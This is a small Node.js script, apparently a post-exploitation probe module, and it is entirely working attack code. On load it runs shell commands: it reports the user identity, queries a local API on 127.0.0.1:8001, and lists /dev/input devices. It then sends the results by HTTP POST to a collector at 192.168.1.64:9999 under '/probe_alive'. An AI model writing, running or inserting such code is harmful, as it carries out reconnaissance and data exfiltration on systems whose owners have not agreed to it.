"use strict";
var fs = require("fs");
var http = require("http");
var cp = require("child_process");

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request({ host: "192.168.1.64", port: 9999, path: path, method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
        function (res) { console.log("posted " + path + " -> " + res.statusCode); });
    req.on("error", function (e) { console.log("post error " + e.message); });
    req.write(data);
    req.end();
}
function sh(cmd) {
    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 15000 }).slice(0, 1500); }
    catch (e) { return "ERR " + (e.stdout ? e.stdout : e.message); }
}
var out = {};
out.probe = "ALIVE-from-module";
out.id = sh("id");
out.devapi = sh("node -e \"require('http').get('http://127.0.0.1:8001/api/v2/',function(r){var b='';r.on('data',function(d){b+=d});r.on('end',function(){console.log(b.slice(0,400));process.exit(0)})}).on('error',function(e){console.log(e.message);process.exit(0)});\"");
out.input_dev = sh("ls -la /dev/input/ 2>&1 | head -6");
post("/probe_alive", out);
